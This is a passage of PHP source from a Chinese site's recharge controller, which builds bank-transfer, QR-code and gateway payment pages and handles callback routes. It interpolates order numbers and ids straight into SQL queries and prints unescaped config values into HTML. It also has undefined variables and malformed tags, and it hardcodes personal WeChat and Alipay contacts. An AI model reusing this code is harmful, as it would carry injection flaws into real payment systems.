            $this->pay_online($payment['id'], $amount, $orderNo);
        } else if ($payment['action_type'] == 'qrcode') {
            //转账支付，扫码
            $this->_pay_qr_code($payment['id'], $amount, $orderNo);
		} else if ($payment['action_type'] == 'online_qrcode') {
            // 获取支付实例
            $instance = $this->get_pay_instance($payment);
            $instance->user = $this->user;
            $json['pay'] = $instance->pay($payment, $amount, $orderNo, $url_callback, $url_return);
            $json['action_type'] = $payment['action_type'];
            if ($json["pay"] === false) {
                $this->api_err_return($instance->errMsg);
            }
            if (is_array($json)) {
                $this->api_return("suc", 200, $json);
            } else {
                $this->api_err_return("支付接口调用失败");
            }
        } else {
            // 获取支付实例
            $instance = $this->get_pay_instance($payment);
            $instance->user = $this->user;
            $json['pay'] = $instance->pay($payment, $amount, $orderNo, $url_callback, $url_return);
            $json['action_type'] = $payment['action_type'];
            if ($json["pay"] === false) {
                $this->api_err_return($instance->errMsg);
            }
            if (is_array($json)) {
                $this->api_return("suc", 200, $json);
            } else {
                $this->api_err_return("支付接口调用失败");
            }
        }
    }
	
	private function _pay_bank_tran($payment_id, $amount, $order_no)
    {
        //获取支付配置
        $payment = $this->db->find("{$this->db_prefix}payments", array('id' => $payment_id));
        if (!$payment) core::error('系统错误');
        if ((int)$payment['enable'] !== 1) core::error('该充值方式已停用');
        $backConfig = json_decode($payment['config'], true);

        $html = '<div class="detail" style="font-size: 15px"><table class="table table-hover" cellpadding="0" cellspacing="0" width="100%">';
        $html .= '<tr>';
        $html .= '<td>充值金额</td>';
        $html .= "<td><strong class='text-danger'>{$amount}元</strong></td>";
        $html .= '</tr>';
        $html .= '<tr>';
        if($payment['driver']!='huimeng'){
        //配置
        $config = json_decode($payment['config'], true);
        foreach ($config as $item) {
            $html .= '<tr>';
            $html .= "<td><a>{$item['key']}</a></td>";
            $html .= "<td><span class='text-primary'>{$item['value']}</></td>";
            $html .= '</tr>';
			if($item['key']=="收款账号"){
				$skhao=$item['value'];
			}
        }
        $html .= '<tr>';
        $html .= "<td><span class='text-danger'>订单编号</span></td>";
        $html .= "<td><span>{$order_no}</></td>";
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td colspan="2"><a class="icon-link-ext" onclick="jsCopy()">点击复制</a></td>';
        $html .= '</tr>';
        $html .= '<tr class="mark">';
        $html .= '<td colspan="2" style="color:#35928f">注：请务必把充值单号填写在备注栏，否则无法及时到账！</td>';
        $html .= '</tr>';
        $html .= '</table></div>';
		$html .= '<textarea cols="1" rows="0" id="fuzhi" style="border: 0;padding: 0;width:0.1px;height:0.1px;">'.$skhao.'</textarea>'."\n";
        }else if($payment['id']=='12'){

include($_SERVER['DOCUMENT_ROOT'].'/19SKPAY/function.php');
require_once($_SERVER['DOCUMENT_ROOT']."/19SKPAY/19sk.config.php");
require_once($_SERVER['DOCUMENT_ROOT']."/19SKPAY/p4/wxpay/wx_config.php");
$Money=$amount;
$uid=$this->user['uid'];
$dingdanhao=$order_no;
$get_ip=$_SERVER["REMOTE_ADDR"];
$url='http://www.26sk.cn/payment/apipay/wxpay/example/native.php?';
$md5='orderid='.$dingdanhao.'&userid='.$userid.'&notifyurl='.$returnurl.'&money='.$Money.$key;
$sign=md5($md5);
$url=$url.'userid='.$userid.'&orderid='.$dingdanhao.'&body=给'.$_SERVER['HTTP_HOST'].'的会员'.$uid.'充值&money='.$Money.'&notifyurl='.$returnurl.'&sign='.$sign;
$url = @file_get_contents($url);
//$url = iconv('utf-8','gb2312',$url);
//$allArray=(explode("|", $url));
$ewm=$url;
if($ewm=='') core::error('支付提交失败请重试'.$url);

//连接数据库
$con = mysql_connect($DB_HOST,$DB_USER,$DB_PASSWORD);
mysql_select_db($DB_NAME, $con);
mysql_query("set names 'UTF-8'");
$result=mysql_query("select * from ".$DB_PRENAME."member_recharge where rechargeId='$dingdanhao'");
$sql_log=mysql_fetch_array($result);
mysql_close($con);
			$html = '<input name="OrderNo" class="OrderNo" type="hidden" value="'.$order_no.'">';
			$html .= '<div class="detail"><table cellpadding="0" cellspacing="0" width="100%">';
            $html .= '<tr>';
            $html .= '<td>充值金额</td>';
            $html .= '<td>' . $amount . ' 元</td>';
            $html .= '</tr>';
			$html .= '<tr>';
			$html .= "<td colspan='2'><img style='height: 17em;' src='{$ewm}' alt=''></td>";
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2"><a class="icon-link-ext" target="_blank">扫码充值</a></td>';
            $html .= '</tr>';
			$html .= '<tr>';
            $html .= "<td><span class='text-danger'>订单编号</span></td>";
            $html .= "<td><span>{$order_no}</></td>";
            $html .= '</tr>';
			$html .= '<tr class="mark">';
			$html .= '<td colspan="2" style="color:#35928f">注：请操作成功后在关闭提示！</td>';
			$html .= '</tr>';
            $html .= '</table></div>';
}else{
			$config = json_decode($payment['config'], true);
			foreach ($config as $item) {
				$action = $item['value'];
			}
		    $html = '<form action="'.$action.'" method="post" target="_blank">';
			$html .= '<input name="uid" type="hidden" value="'.$this->user['uid'].'">';
			$html .= '<input name="amount" type="hidden" value="'.$amount.'">';
			$html .= '<input name="OrderNo" type="hidden" value="'.$order_no.'">';
			$html .= '<div class="detail"><table cellpadding="0" cellspacing="0" width="100%">';
            $html .= '<tr>';
            $html .= '<td>充值金额</td>';
            $html .= '<td>' . $amount . ' 元</td>';
            $html .= '</tr>';
			$html .= '<tr>';
            $html .= "<td><span class='text-danger'>订单编号</span></td>";
            $html .= "<td><span>{$order_no}</></td>";
            $html .= '</tr>';
			$html .= '<tr class="mark">';
			$html .= '<td colspan="2" style="color:#35928f">注：请操作成功后在关闭提示！</td>';
			$html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2"><button type="submit" class="btn btn-danger icon-ok">充值</button></td>';
            $html .= '</tr>';
            $html .= '</table></div>';
			$html .= '</form>';
}
        $json['pay']["pay_html"] = $html;
        $json['action_type'] = $payment['action_type'];

        $this->api_return("success", 200, $json);

    }

    private function _pay_qr_code($payment_id, $amount, $order_no)
    {
        //获取支付配置
        $payment = $this->db->find("{$this->db_prefix}payments", array('id' => $payment_id));
        if (!$payment) core::error('系统错误');
        if ((int)$payment['enable'] !== 1) core::error('该充值方式已停用');
        $backConfig = json_decode($payment['config'], true);
        $html = '<div class="detail"><table class="table table-hover" cellpadding="0" cellspacing="0" width="100%">';
        $html .= '<tr>';
        $html .= '<td>充值金额</td>';
        $html .= '<td>' . $amount . ' 元</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<tr>';
        $img = $payment['driver'];
        $html .= "<td colspan='2'><img style='height: 17em;' src='{$img}' alt=''></td>";
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td colspan="2"><a class="icon-link-ext" target="_blank">微信:&nbsp blgj668668 <br> 支付宝:&nbsp 1731788879@qq.com <br>注：请扫码加好友或添加上述微信号支付宝为好友，方便转账交易
</a></td>';
        $html .= '</tr>';
		$html .= '<tr>';
        //$html .= "<td><span class='text-danger'>订单编号</span></td>";
        //$html .= "<td><span>{$order_no}</></td>";
        $html .= '</tr>';
        //$html .= '<tr class="mark">';
        //$html .= '<td colspan="2" style="color:#35928f">注：请加微信blgj668668支付宝1731788879@qq.com为好友，方便转账交易</td>';
        //$html .= '</tr>';
        $html .= '</table></div>';
        $json['pay']["pay_html"] = $html;
        $json['action_type'] = $payment['action_type'];

        $this->api_return("success", 200, $json);
    }

    // 在线支付支付方法
    private function pay_online($payment_id, $amount, $order_no)
    {
        //获取支付配置
        $payment = $this->db->query("SELECT * FROM `{$this->db_prefix}payments` WHERE `id`={$payment_id} LIMIT 1", 2);
        if (!$payment) core::error('系统错误');
        if ((int)$payment['enable'] !== 1) core::error('该充值方式已停用');
        $backConfig = json_decode($payment['config'], true);
        if ($payment['action_type'] === '1') { // 支付宝
            $html = '<div class="detail"><table cellpadding="0" cellspacing="0" width="100%">';
            $html .= '<tr>';
            $html .= '<td>充值单号</td>';
            $html .= '<td>' . $order_no . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td>充值金额</td>';
            $html .= '<td>' . $amount . ' 元</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<tr>';
            $html .= '<td>收款账号</td>';
            $html .= '<td>' . $backConfig['account'] . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td>收款人姓名</td>';
            $html .= '<td>' . $backConfig['username'] . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2"><a class="icon-link-ext" style="color:#35928f" href="https://shenghuo.alipay.com/send/payment/fill.htm" target="_blank">前往支付宝充值</a></td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2" style="color:#35928f">注：请务必把充值单号填写在备注栏，否则无法及时到账！</td>';
            $html .= '</tr>';
            $html .= '</table></div>';
            $json['html'] = $html;
            $json['action_type'] = $payment['action_type'];
            $this->api_return("success", 200, $json);
        } else { // 财付通
            $html = '<div class="detail"><table cellpadding="0" cellspacing="0" width="100%">';
            $html .= '<tr>';
            $html .= '<td>充值单号</td>';
            $html .= '<td>' . $order_no . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td>充值金额</td>';
            $html .= '<td>' . $amount . ' 元</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<tr>';
            $html .= '<td>收款账号</td>';
            $html .= '<td>' . $backConfig['account'] . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td>收款人姓名</td>';
            $html .= '<td>' . $backConfig['username'] . '</td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2"><a class="icon-link-ext" style="color:#35928f" href="https://www.tenpay.com/v2/account/pay/index.shtml" target="_blank">前往财付通充值</a></td>';
            $html .= '</tr>';
            $html .= '<tr>';
            $html .= '<td colspan="2" style="color:#35928f">注：请务必把充值单号填写在备注栏，否则无法及时到账！</td>';
            $html .= '</tr>';
            $html .= '</table></div>';
            $json['html'] = $html;
            $json['action_type'] = $payment['action_type'];
            $this->api_return("success", 200, $json);
        }
    }

    public function pay_callback()
    {
        $instance = $this->get_pay_instance(array('id' => 1, 'driver' => 'mobao'));
        $instance->callback();
    }

    //墨宝支付回调
    public function pay_mobao_cb()
    {
        $payment = array('id' => 1, 'driver' => 'mobao');
        $instance = $this->get_pay_instance($payment);
        $instance->callback(function ($order) {
            core::lib("pay")->call(1, $order['tradeAmt'], $order['orderNo']);
        });
    }

    //讯付通支付回调
    public function pay_xunftong_cb()
    {
        $payment = array('id' => 4, 'driver' => 'xunftong');
        $instance = $this->get_pay_instance($payment);
        $instance->callback(function ($order) {
            //回调支付
            core::lib("pay")->call(4, $order['tradeAmt'], $order['orderNo']);
        });
    }

    public function pay_dinpay_b2c_cb()
    {
        $payment = array('id' => 10, 'driver' => 'dinpay_b2c');
        $instance = $this->get_pay_instance($payment);
        $this->logger->warn("pay", $instance);
        $instance->callback(function ($order) {
            //回调支付
            $this->logger->warn("pay", $order);
            core::lib("pay")->call(10, $order['tradeAmt'], $order['orderNo']);
        });
    }

    #endregion


    private function get_browser()
    {
        $flag = $_SERVER['HTTP_USER_AGENT'];
        $para = array();
        if (preg_match('/Windows[\d\. \w]*/', $flag, $match)) $para['os'] = $match[0]; // 检查操作系统
        if (preg_match('/Chrome\/[\d\.\w]*/', $flag, $match)) { // 检查Chrome
            $para['browser'] = $match[0];
        } else if (preg_match('/Safari\/[\d\.\w]*/', $flag, $match)) { // 检查Safari
            $para['browser'] = $match[0];
        } else if (preg_match('/MSIE [\d\.\w]*/', $flag, $match)) { // IE
            $para['browser'] = $match[0];
        } else if (preg_match('/Opera\/[\d\.\w]*/', $flag, $match)) { // opera
            $para['browser'] = $match[0];
        } else if (preg_match('/Firefox\/[\d\.\w]*/', $flag, $match)) { // Firefox
            $para['browser'] = $match[0];
        } else if (preg_match('/OmniWeb\/(v*)([^\s|;]+)/i', $flag, $match)) { // OmniWeb
            $para['browser'] = $match[2];
        } else if (preg_match('/Netscape([\d]*)\/([^\s]+)/i', $flag, $match)) { // Netscape
            $para['browser'] = $match[2];
        } else if (preg_match('/Lynx\/([^\s]+)/i', $flag, $match)) { // Lynx
            $para['browser'] = $match[1];
        } else if (preg_match('/360SE/i', $flag, $match)) { // 360SE
            $para['browser'] = '360安全浏览器';
        } else if (preg_match('/SE 2.x/i', $flag, $match)) { // 搜狗
            $para['browser'] = '搜狗浏览器';
        } else {
            $para['browser'] = 'unkown';
        }
        return $para;
    }

}